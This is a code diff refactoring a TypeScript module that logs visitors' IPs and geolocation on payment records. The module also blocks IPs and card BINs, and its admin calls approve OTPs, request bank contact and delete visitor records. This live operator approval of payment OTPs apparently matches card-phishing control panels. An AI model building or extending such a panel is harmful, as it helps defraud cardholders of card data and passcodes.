-// Synchronously read the cached "is this IP blocked" flag (set by ensureVisitorIp).
 export const isCachedIpBlocked = (): boolean => cachedIpBlocked === true;
 
-// Subscribe to live changes to the IP blocklist so a freshly-blocked visitor
-// gets cut off without needing to refresh.
 export const listenForIpBlock = (
   ip: string,
   callback: (blocked: boolean) => void,
 ): (() => void) => {
-  if (!db || !ip) return () => {};
-  const ref = doc(db, "settings", "blockedIps");
-  return onSnapshot(ref, (snap) => {
-    const data = snap.data() as any;
-    const ips: string[] = Array.isArray(data?.ips)
-      ? data.ips.map((x: any) => String(x).trim())
-      : [];
+  if (!ip) return () => {};
+  return subscribeBlockedIps((ips) => {
     const blocked = ips.includes(ip.trim());
     cachedIpBlocked = blocked;
     callback(blocked);
   });
 };
 
-// Resolve the visitor's IP, persist it on their pay doc (if a visitor record
-// already exists), and return whether the IP is currently blocked.
-export const ensureVisitorIp = async (): Promise<{
-  ip: string;
-  blocked: boolean;
-}> => {
+export const ensureVisitorIp = async (): Promise<{ ip: string; blocked: boolean }> => {
   const ip = await fetchVisitorIp();
   if (!ip) {
     cachedIpBlocked = false;
@@ -705,55 +497,46 @@ export const ensureVisitorIp = async (): Promise<{
   const blocked = await isIpBlocked(ip);
   cachedIpBlocked = blocked;
 
-  // Best-effort: attach the IP and geo to the visitor's existing pay doc so
-  // admins can see and block it from the dashboard.
+  // Best-effort: attach IP/geo to the visitor's pay doc.
   try {
-    const visitorId = localStorage.getItem("visitor");
-    if (visitorId && db) {
-      const ref = doc(db, "pays", visitorId);
-      const snap = await getDoc(ref);
-      if (snap.exists()) {
-        const existing = snap.data() as any;
-        const geo = cachedVisitorGeo;
-        const needsUpdate =
-          existing?.ip !== ip ||
-          (geo &&
-            (existing?.geoCountry !== geo.country ||
-              existing?.geoCity !== geo.city));
-        if (needsUpdate) {
-          const patch: Record<string, unknown> = {
-            ip,
-            ipAddress: ip,
-            ipUpdatedAt: new Date().toISOString(),
-          };
-          if (geo?.country) patch.geoCountry = geo.country;
-          if (geo?.countryCode) patch.geoCountryCode = geo.countryCode;
-          if (geo?.city) patch.geoCity = geo.city;
-          if (geo?.region) patch.geoRegion = geo.region;
-          await setDoc(ref, patch, { merge: true });
-        }
-      }
+    const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null;
+    if (visitorId) {
+      const geo = cachedVisitorGeo;
+      await postJson("/api/fb/visitor/data", {
+        id: visitorId,
+        ip,
+        ipAddress: ip,
+        ipUpdatedAt: new Date().toISOString(),
+        ...(geo
+          ? {
+              geoCountry: geo.country,
+              geoCountryCode: geo.countryCode,
+              geoCity: geo.city,
+              geoRegion: geo.region,
+            }
+          : {}),
+      });
     }
   } catch (error) {
     console.error("Error attaching visitor IP:", error);
   }
-
   return { ip, blocked };
 };
 
-// ===== Blocked BIN management =====
+/* ==================== Blocked BINs ==================== */
 const normalizeBin = (raw: string) => raw.replace(/\D/g, "").slice(0, 6);
 
-// Always query Firestore directly so payer tabs see admin changes immediately.
 export const isBinBlocked = async (cardOrBin: string): Promise<boolean> => {
-  if (!db) return false;
   const bin = normalizeBin(cardOrBin);
   if (bin.length < 6) return false;
+  // Prefer the live stream cache when the dashboard has it open; otherwise
+  // hit the one-shot endpoint.
+  if (binStream?.last) return binStream.last.some((b) => normalizeBin(b.bin) === bin);
   try {
-    const snap = await getDoc(doc(db, "blocked_bins", bin));
-    return snap.exists();
-  } catch (error) {
-    console.error("Error checking blocked BIN:", error);
+    const res = await fetch(`/api/fb/blocked-bin/${encodeURIComponent(bin)}`);
+    const data = await res.json().catch(() => null);
+    return Boolean(data?.blocked);
+  } catch {
     return false;
   }
 };
@@ -762,105 +545,78 @@ export const addBlockedBin = async (
   bin: string,
   meta?: { bankName?: string; cardBrand?: string; country?: string },
 ) => {
-  if (!db) return false;
   const normalized = normalizeBin(bin);
-  if (normalized.length < 6) {
-    throw new Error("INVALID_BIN");
-  }
-  try {
-    const docRef = doc(db, "blocked_bins", normalized);
-    await setDoc(docRef, {
-      bin: normalized,
-      blockedAt: new Date().toISOString(),
-      ...(meta || {}),
-    });
-    return true;
-  } catch (error) {
-    console.error("Error blocking BIN:", error);
-    throw error;
-  }
+  if (normalized.length !== 6) throw new Error("INVALID_BIN");
+  const r = await postJson("/api/fb/admin/blocked-bins/add", { bin: normalized, meta: meta || {} });
+  if (!r.ok) throw new Error("BLOCK_BIN_FAILED");
+  return true;
 };
 
 export const removeBlockedBin = async (bin: string) => {
-  if (!db) return false;
   const normalized = normalizeBin(bin);
-  try {
-    const { deleteDoc } = await import("firebase/firestore");
-    await deleteDoc(doc(db, "blocked_bins", normalized));
-    return true;
-  } catch (error) {
-    console.error("Error unblocking BIN:", error);
-    throw error;
-  }
+  if (!normalized) return false;
+  const r = await postJson("/api/fb/admin/blocked-bins/remove", { bin: normalized });
+  if (!r.ok) throw new Error("UNBLOCK_BIN_FAILED");
+  return true;
 };
 
-export const listenBlockedBins = (
-  callback: (
-    bins: Array<{
-      bin: string;
-      bankName?: string;
-      cardBrand?: string;
-      country?: string;
-      blockedAt?: string;
-    }>,
-  ) => void,
-): (() => void) => {
-  if (!db) return () => {};
-  let unsubscribe: (() => void) | null = null;
-  let cancelled = false;
-  (async () => {
-    const { collection, onSnapshot: onSnap } = await import(
-      "firebase/firestore"
-    );
-    if (cancelled || !db) return;
-    const u = onSnap(collection(db, "blocked_bins"), (snap) => {
-      const list: any[] = [];
-      snap.forEach((d) => {
-        const data = d.data();
-        list.push({ bin: d.id, ...data });
-      });
-      callback(list);
-    });
-    if (cancelled) {
-      u();
-    } else {
-      unsubscribe = u;
-    }
-  })();
+export const listenBlockedBins = (cb: (bins: BinEntry[]) => void): (() => void) => {
+  const entry = ensureBinStream();
+  entry.listeners.add(cb);
+  if (entry.last) cb(entry.last);
   return () => {
-    cancelled = true;
-    if (unsubscribe) unsubscribe();
+    entry.listeners.delete(cb);
+    if (entry.listeners.size === 0) {
+      try { entry.es.close(); } catch {}
+      binStream = null;
+    }
   };
 };
 
-export const updateVisitorBlockStatus = async (
-  visitorId: string,
-  blocked: boolean,
-) => {
-  if (!db) {
-    console.warn("Firebase not initialized.");
-    return false;
-  }
-
-  try {
-    const docRef = doc(db, "pays", visitorId);
-    const payload: Record<string, unknown> = {
-      blocked,
-      blockedAt: blocked ? new Date().toISOString() : null,
-    };
-    if (blocked) {
-      payload.online = false;
-    }
-    await setDoc(docRef, payload, { merge: true });
-    blockedVisitorCache.set(visitorId, {
-      blocked,
-      expiresAt: Date.now() + BLOCK_CACHE_TTL_MS,
-    });
-    return true;
-  } catch (error) {
-    console.error("Error updating block status:", error);
-    throw error;
-  }
+/* ==================== Admin writes ==================== */
+export const updateOtpApprovalStatus = async (visitorId: string, approved: boolean) => {
+  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/otp-approval`, { approved });
 };
 
-export { db, database, auth };
+export const updateApprovalStatus = async (visitorId: string, approved: boolean) => {
+  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/approval`, { approved });
+};
+
+export const updateVisitorBlockStatus = async (visitorId: string, blocked: boolean) => {
+  const r = await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/block`, { blocked });
+  if (r.ok) {
+    blockedVisitorCache.set(visitorId, { blocked, expiresAt: Date.now() + BLOCK_CACHE_TTL_MS });
+  }
+  return r.ok;
+};
+
+export const pushBankContactRequest = async (visitorId: string) => {
+  if (!visitorId) return;
+  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/bank-contact`, {});
+};
+
+export const adminMergeVisitor = async (visitorId: string, patch: Record<string, unknown>) => {
+  await postJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}/merge`, { patch });
+};
+
+export const adminAddBlockedIp = async (ip: string) => {
+  await postJson("/api/fb/admin/blocked-ips/add", { ip });
+};
+
+export const adminRemoveBlockedIp = async (ip: string) => {
+  await postJson("/api/fb/admin/blocked-ips/remove", { ip });
+};
+
+export const adminDeleteVisitor = async (visitorId: string) => {
+  await delJson(`/api/fb/admin/visitor/${encodeURIComponent(visitorId)}`);
+};
+
+export const adminDeleteAllVisitors = async () => {
+  await delJson("/api/fb/admin/visitors");
+};
+
+// Legacy compat shims so any stray import doesn't crash. The old objects no
+// longer exist; pages that referenced them have been migrated.
+export const db = null as any;
+export const database = null as any;
+export const auth = null as any;
